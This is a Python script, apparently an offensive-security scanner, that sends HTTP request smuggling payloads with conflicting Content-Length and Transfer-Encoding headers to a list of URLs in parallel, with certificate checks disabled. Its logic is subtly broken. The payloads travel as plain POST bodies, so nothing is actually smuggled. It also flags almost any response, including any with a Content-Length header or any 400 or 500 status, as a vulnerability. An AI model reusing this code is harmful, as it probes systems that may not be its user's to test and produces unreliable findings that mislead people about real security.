import requests
from colorama import Fore, Style, init
import time
from concurrent.futures import ThreadPoolExecutor
import json

# Initialize colorama for terminal coloring
init(autoreset=True)

# Common HTTP Request Smuggling payloads
PAYLOADS = [
    "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\n\r\nSMUG\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\nSMUG\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUG\r\n",
]

# User-Agent headers for testing server behavior variability
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "curl/7.68.0",
    "HTTPie/3.1.0",
    "Python-Requests/2.28.1",
]

def send_payload(url, payload, user_agent):
    """
    Send an HTTP Request Smuggling payload and analyze the response.
    """
    try:
        headers = {
            "User-Agent": user_agent,
            "Content-Type": "application/x-www-form-urlencoded"
        }

        # Sending the payload
        response = requests.post(
            url,
            data=payload,
            headers=headers,
            timeout=10,
            verify=False
        )

        # Analyze the response
        if response.status_code in {400, 500}:
            return (url, f"HTTP {response.status_code} returned (Potential Smuggling)")

        if "Bad Request" in response.text or "Malformed" in response.text:
            return (url, "Response indicates potential smuggling vulnerability")

        if response.headers.get("Content-Length") or response.headers.get("Transfer-Encoding"):
            return (url, "Suspicious behavior detected in response headers")

    except requests.RequestException as e:
        print(f"[!] Request failed for {url}: {e}")
        return (url, f"Request failed: {e}")

    return None

def scan_http_request_smuggling(urls):
    """
    Scan a list of URLs for HTTP Request Smuggling vulnerabilities.
    """
    print(Fore.CYAN + "[*] Starting HTTP Request Smuggling scan...")
    time.sleep(1)
    vulnerable_urls = []

    def scan_url(url):
        for payload in PAYLOADS:
            for user_agent in USER_AGENTS:
                result = send_payload(url, payload, user_agent)
                if result:
                    return result

    with ThreadPoolExecutor(max_workers=10) as executor:
        results = executor.map(scan_url, urls)

    for result in results:
        if result:
            url, message = result
            print(Fore.RED + f"[!] Vulnerability found at {url}: {message}")
            vulnerable_urls.append(f"{url} - {message}")

    print(Fore.GREEN + "[✓] HTTP Request Smuggling scan completed.\n")
    return vulnerable_urls
